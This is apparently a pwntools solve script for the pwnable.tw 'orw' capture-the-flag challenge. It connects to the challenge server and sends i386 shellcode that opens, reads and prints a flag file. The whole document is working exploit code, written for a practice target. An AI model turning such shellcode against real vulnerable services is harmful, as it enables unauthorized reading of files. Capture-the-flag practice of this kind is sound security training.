from pwn import *

context.update(arch='i386', os='linux')

#r = process('./orw')
r = remote('chall.pwnable.tw', 10001)

r.recvuntil('Give my your shellcode:')
shellcode = '''
/* push '/home/orw/flag\x00' */
    	push 0x1010101
    	xor dword ptr [esp], 0x1016660
    	push 0x6c662f77
    	push 0x726f2f65
    	push 0x6d6f682f
/* open(file='esp', oflag='O_RDONLY', mode=0) */
   	mov ebx, esp
    	xor ecx, ecx
    	xor edx, edx
/* call open() */
    	push SYS_open /* 5 */
    	pop eax
    	int 0x80
/*call read()*/
	push eax
	push 0x3
	pop eax
	pop ebx
	push 60
	pop edx
	mov ecx, esp
	int 0x80
/*call write()*/
	push 0x4
	pop eax
	push 0x1
	pop ebx
	push 60
	pop edx
	mov ecx, esp
	int 0x80
'''
print disasm(asm(shellcode))
r.sendline(asm(shellcode))

r.interactive()
